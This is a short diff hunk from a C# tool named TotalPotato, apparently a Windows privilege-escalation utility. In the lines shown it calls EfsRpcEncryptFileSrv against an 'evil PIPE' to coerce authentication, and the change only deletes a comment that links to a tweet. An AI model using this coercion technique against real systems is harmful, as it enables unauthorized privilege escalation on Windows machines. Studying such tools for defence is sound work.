@@ -92,7 +92,6 @@ namespace TotalPotato
                 Console.WriteLine($"[+] Triggering name pipe access on evil PIPE {targetPipe}");
 
                 c.EfsRpcEncryptFileSrv(targetPipe);
-                // More useful functions here https://twitter.com/tifkin_/status/1421225980161626112
             }
         }
     }
